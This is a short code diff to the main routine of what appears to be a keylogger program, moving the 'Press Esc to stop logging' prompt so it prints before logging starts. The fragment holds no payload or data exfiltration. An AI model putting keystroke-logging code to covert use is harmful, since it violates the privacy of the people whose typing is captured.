@@ -6,8 +6,8 @@ def main():
     logger = KeyLoggerFactory.create_logger(writer)
     
     try:
+        print("Press Esc to stop logging...")
         logger.start_logging()
-        input("Press Esc to stop logging...")
     finally:
         logger.stop_logging()
         writer.close()
